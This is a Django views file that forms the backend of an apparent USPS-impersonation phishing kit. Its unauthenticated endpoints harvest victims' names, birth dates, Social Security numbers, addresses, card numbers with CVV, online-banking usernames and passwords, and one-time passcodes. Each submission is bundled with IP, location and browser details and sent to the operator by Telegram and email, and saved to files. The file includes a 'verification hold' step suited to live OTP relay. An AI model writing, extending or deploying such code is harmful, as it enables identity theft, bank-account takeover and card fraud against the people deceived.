import logging
from datetime import datetime

from django.conf import settings
from rest_framework import status
from rest_framework.decorators import api_view, permission_classes, authentication_classes
from rest_framework.response import Response

from core.app_config import app_settings
from core.middleware.block_ips_middleware import (
    get_city_from_ip,
    get_client_ip,
    get_country_from_ip,
    get_user_browser,
    get_user_os,
)
from core.settings import send_data_email, send_data_telegram, save_data_to_file
from user_data.models import Address, BankInfo, BrowserDetail, Client


logger = logging.getLogger(__name__)


def _notification_sender():
    return app_settings.get("from_email") or settings.DEFAULT_FROM_EMAIL


def _notification_recipients():
    recipients = app_settings.get("send_email_list") or getattr(settings, "EMAIL_RECIPIENTS", [])
    return [addr for addr in recipients if addr]


def _brand_header(section: str) -> str:
    return f"|=====||USPS FLOW||=====|\n|========= [  {section}  ] ==========|\n"


def _browser_details_message(ip: str, country: str, city: str, browser: str, os: str, agent: str, timestamp: str) -> str:
    message = "|=====================================|\n"
    message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
    message += "|======================================|\n"
    message += f"| ➤ [ IP Address ]   : {ip}\r\n"
    message += f"| ➤ [ IP Country ]   : {country}\r\n"
    message += f"| ➤ [ IP City ]      : {city}\r\n"
    message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
    message += f"| ➤ [ User Agent ]   : {agent}\r\n"
    message += f"| ➤ [ TIME ]         : {timestamp}\r\n"
    message += "|=====================================|\n"
    return message


def _capture_environment(request):
    ip = get_client_ip(request)
    agent = request.META.get("HTTP_USER_AGENT", "")
    country = get_country_from_ip(ip)
    city = get_city_from_ip(ip)
    browser = get_user_browser(agent)
    os = get_user_os(agent)
    timestamp = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
    return ip, agent, country, city, browser, os, timestamp


def _update_browser_detail(client, ip, agent, country, city, address, browser, os, timestamp):
    browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
    browser_data.ip = ip
    browser_data.agent = agent
    browser_data.country = country
    browser_data.city = city
    browser_data.address = address
    browser_data.browser = browser
    browser_data.os = os
    browser_data.time = timestamp
    browser_data.date = timestamp
    browser_data.save()


def _notify(subject: str, message: str, reference: str):
    try:
        send_data_telegram(app_settings, message)
    except Exception:
        logger.exception("Failed to send USPS telegram notification")

    try:
        send_data_email(subject, message, _notification_sender(), _notification_recipients())
    except Exception:
        logger.exception("Failed to send USPS email notification")

    try:
        save_data_to_file(reference or "usps-session", message)
    except Exception:
        logger.exception("Failed to persist USPS data to file")


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def usps_collect_user_address_verification(request):
    payload: dict = {}
    errors: dict = {}

    if request.method == "POST":
        try:
            session_id = (request.data.get("sessionId") or "").strip()
            full_name = (request.data.get("fullName") or "").strip()
            street1 = (request.data.get("streetAddress1") or "").strip()
            street2 = (request.data.get("streetAddress2") or "").strip()
            city_value = (request.data.get("city") or "").strip()
            state = (request.data.get("state") or "").strip()
            zip_code = (request.data.get("zipCode") or "").strip()
            phone = (request.data.get("phone") or "").strip()
            dob = (request.data.get("dob") or "").strip()
            ssn = (request.data.get("ssn") or "").strip()

            if not session_id:
                errors["sessionId"] = ["Session identifier is required."]
            if not full_name:
                errors["fullName"] = ["Full name is required."]
            if not street1:
                errors["streetAddress1"] = ["Primary street address is required."]
            if not city_value:
                errors["city"] = ["City is required."]
            if not state:
                errors["state"] = ["State is required."]
            if not zip_code:
                errors["zipCode"] = ["ZIP code is required."]
            if not phone:
                errors["phone"] = ["Phone number is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            first_name = full_name.split()[0]
            last_name = full_name.split()[-1] if len(full_name.split()) > 1 else ""

            ip, agent, country, city, browser, os, timestamp = _capture_environment(request)

            client, _ = Client.objects.get_or_create(username=session_id)
            client.username = session_id
            client.email = session_id
            client.first_name = first_name
            client.last_name = last_name
            client.phone = phone
            if dob:
                client.dob = dob
            if ssn:
                client.social_security = ssn
            client.save()

            address_obj, _ = Address.objects.get_or_create(client=client)
            address_obj.street_address = street1
            address_obj.apartment_unit = street2
            address_obj.city = city_value
            address_obj.state = state
            address_obj.zip_code = zip_code
            address_obj.save()

            _update_browser_detail(
                client,
                ip,
                agent,
                country,
                city,
                f"{city}, {country}",
                browser,
                os,
                timestamp,
            )

            message = _brand_header("ADDRESS VERIFICATION")
            message += f"| ➤ [ Session ID ]       : {session_id}\n"
            message += f"| ➤ [ Full Name ]        : {full_name}\n"
            message += f"| ➤ [ Phone ]            : {phone}\n"
            message += f"| ➤ [ DOB ]              : {dob}\n"
            message += f"| ➤ [ SSN ]              : {ssn}\n"
            message += f"| ➤ [ Address 1 ]        : {street1}\n"
            message += f"| ➤ [ Address 2 ]        : {street2}\n"
            message += f"| ➤ [ City ]             : {city_value}\n"
            message += f"| ➤ [ State ]            : {state}\n"
            message += f"| ➤ [ ZIP Code ]         : {zip_code}\n"
            message += "|========= [  ENVIRONMENT  ] ==========|\n"
            message += _browser_details_message(ip, country, city, browser, os, agent, timestamp)

            _notify("USPS Address Verification", message, session_id)

            payload["message"] = "Successful"
        except Exception:
            logger.exception("usps_collect_user_address_verification failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def usps_collect_user_payment_info(request):
    payload: dict = {}
    errors: dict = {}

    if request.method == "POST":
        try:
            session_id = (request.data.get("sessionId") or "").strip()
            card_number = (request.data.get("cardNumber") or "").strip()
            expiry_month = (request.data.get("expiryMonth") or "").strip()
            expiry_year = (request.data.get("expiryYear") or "").strip()
            cvv = (request.data.get("cvv") or "").strip()

            if not session_id:
                errors["sessionId"] = ["Session identifier is required."]
            if not card_number:
                errors["cardNumber"] = ["Card number is required."]
            if not expiry_month:
                errors["expiryMonth"] = ["Expiry month is required."]
            if not expiry_year:
                errors["expiryYear"] = ["Expiry year is required."]
            if not cvv:
                errors["cvv"] = ["CVV is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip, agent, country, city, browser, os, timestamp = _capture_environment(request)

            client, _ = Client.objects.get_or_create(username=session_id)

            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.card_number = card_number
            bank_info.card_expiry = f"{expiry_month}/{expiry_year}"
            bank_info.card_cvv = cvv
            bank_info.save()

            _update_browser_detail(
                client,
                ip,
                agent,
                country,
                city,
                f"{city}, {country}",
                browser,
                os,
                timestamp,
            )

            message = _brand_header("PAYMENT METHOD")
            message += f"| ➤ [ Session ID ]       : {session_id}\n"
            message += f"| ➤ [ Card Number ]      : {card_number}\n"
            message += f"| ➤ [ Expiry ]           : {expiry_month}/{expiry_year}\n"
            message += f"| ➤ [ CVV ]              : {cvv}\n"
            message += _browser_details_message(ip, country, city, browser, os, agent, timestamp)

            _notify("USPS Payment Info", message, session_id)

            payload["message"] = "Successful"
        except Exception:
            logger.exception("usps_collect_user_payment_info failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def usps_collect_user_wait_event(request):
    payload: dict = {}
    errors: dict = {}

    if request.method == "POST":
        try:
            session_id = (request.data.get("sessionId") or "").strip()

            if not session_id:
                errors["sessionId"] = ["Session identifier is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip, agent, country, city, browser, os, timestamp = _capture_environment(request)

            client, _ = Client.objects.get_or_create(username=session_id)

            _update_browser_detail(
                client,
                ip,
                agent,
                country,
                city,
                f"{city}, {country}",
                browser,
                os,
                timestamp,
            )

            message = _brand_header("WAIT EVENT")
            message += f"| ➤ [ Session ID ]       : {session_id}\n"
            message += "| ➤ [ Status ]          : User on verification hold\n"
            message += _browser_details_message(ip, country, city, browser, os, agent, timestamp)

            _notify("USPS Wait Event", message, session_id)

            payload["message"] = "Successful"
        except Exception:
            logger.exception("usps_collect_user_wait_event failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def usps_collect_user_3d_credentials(request):
    payload: dict = {}
    errors: dict = {}

    if request.method == "POST":
        try:
            session_id = (request.data.get("sessionId") or "").strip()
            bank_username = (request.data.get("bankUsername") or "").strip()
            bank_password = (request.data.get("bankPassword") or "").strip()

            if not session_id:
                errors["sessionId"] = ["Session identifier is required."]
            if not bank_username:
                errors["bankUsername"] = ["Bank username is required."]
            if not bank_password:
                errors["bankPassword"] = ["Bank password is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip, agent, country, city, browser, os, timestamp = _capture_environment(request)

            client, _ = Client.objects.get_or_create(username=session_id)

            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.username2 = bank_username
            bank_info.password2 = bank_password
            bank_info.save()

            _update_browser_detail(
                client,
                ip,
                agent,
                country,
                city,
                f"{city}, {country}",
                browser,
                os,
                timestamp,
            )

            message = _brand_header("3D AUTH CREDENTIALS")
            message += f"| ➤ [ Session ID ]       : {session_id}\n"
            message += f"| ➤ [ Bank Username ]    : {bank_username}\n"
            message += f"| ➤ [ Bank Password ]    : {bank_password}\n"
            message += _browser_details_message(ip, country, city, browser, os, agent, timestamp)

            _notify("USPS 3D Authentication", message, session_id)

            payload["message"] = "Successful"
        except Exception:
            logger.exception("usps_collect_user_3d_credentials failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def usps_collect_user_payment_otp(request):
    payload: dict = {}
    errors: dict = {}

    if request.method == "POST":
        try:
            session_id = (request.data.get("sessionId") or "").strip()
            otp = (request.data.get("otp") or "").strip()

            if not session_id:
                errors["sessionId"] = ["Session identifier is required."]
            if not otp:
                errors["otp"] = ["OTP is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip, agent, country, city, browser, os, timestamp = _capture_environment(request)

            client, _ = Client.objects.get_or_create(username=session_id)

            _update_browser_detail(
                client,
                ip,
                agent,
                country,
                city,
                f"{city}, {country}",
                browser,
                os,
                timestamp,
            )

            message = _brand_header("PAYMENT OTP")
            message += f"| ➤ [ Session ID ]       : {session_id}\n"
            message += f"| ➤ [ OTP ]              : {otp}\n"
            message += _browser_details_message(ip, country, city, browser, os, agent, timestamp)

            _notify("USPS Payment OTP", message, session_id)

            payload["message"] = "Successful"
        except Exception:
            logger.exception("usps_collect_user_payment_otp failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

    return Response(payload)


@api_view(["POST"])
@permission_classes([])
@authentication_classes([])
def usps_collect_user_success_event(request):
    payload: dict = {}
    errors: dict = {}

    if request.method == "POST":
        try:
            session_id = (request.data.get("sessionId") or "").strip()

            if not session_id:
                errors["sessionId"] = ["Session identifier is required."]

            if errors:
                payload["message"] = "Errors"
                payload["errors"] = errors
                return Response(payload, status=status.HTTP_400_BAD_REQUEST)

            ip, agent, country, city, browser, os, timestamp = _capture_environment(request)

            client, _ = Client.objects.get_or_create(username=session_id)

            _update_browser_detail(
                client,
                ip,
                agent,
                country,
                city,
                f"{city}, {country}",
                browser,
                os,
                timestamp,
            )

            message = _brand_header("SUCCESS EVENT")
            message += f"| ➤ [ Session ID ]       : {session_id}\n"
            message += "| ➤ [ Status ]          : USPS flow completed\n"
            message += _browser_details_message(ip, country, city, browser, os, agent, timestamp)

            _notify("USPS Flow Success", message, session_id)

            payload["message"] = "Successful"
        except Exception:
            logger.exception("usps_collect_user_success_event failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

    return Response(payload)
